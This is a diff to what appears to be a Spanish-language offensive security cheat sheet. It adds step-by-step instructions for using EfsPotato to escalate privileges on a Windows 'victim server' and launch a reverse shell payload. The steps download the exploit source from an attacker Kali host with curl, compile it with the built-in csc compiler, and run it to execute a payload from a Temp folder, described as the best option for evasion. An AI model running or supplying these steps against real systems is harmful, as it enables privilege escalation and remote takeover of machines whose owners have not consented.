@@ -133,6 +133,32 @@ Windows 8/10/11 y Server 2012–2022	        GodPotato, SigmaPotato
 
 ++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 
+# USAR EfsPotato     <--- Mejor Opción Evasión 
+
+PASOS con 'EfsPotato' para ejecuta una Reverse Shell:
+❯ https://github.com/zcgonvh/EfsPotato    # Se necesita compilar en la máquina Windows 
+
+Paso 1:
+# En el server windows buscar el compilador 'csc'  
+❯ ls C:\Windows\Microsoft.Net\Framework\
+
+	C:\Windows\Microsoft.Net\Framework\v4.0.30319\csc.exe     # Ejemplo de la ruta del compilador 
+
+Paso 2:
+# Transferir al server víctima el 'EfsPotato.cs' desde Kali  
+❯ curl http://IP_Kali/EfsPotato.cs -o C:\Temp\EfsPotato.cs
+
+Paso 3:
+# Compilar en el server víctima para obtener el archivo 'EfsPotato.exe'
+❯ C:\Windows\Microsoft.Net\Framework\v4.0.30319\csc.exe /platform:x86 C:\Temp\EfsPotato.cs -nowarn:1691,618
+
+Paso 4:
+# Ejecutar un comando 
+❯ .\EfsPotato.exe "cmd.exe /C C:\Users\<user1>\AppData\Local\Temp\0xb0b.exe"
+
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
 # USAR GodPotato-NET4     <--- Mejor Opción
 
 PASOS con 'GodPotato-NET4' para ejecuta una Reverse Shell:
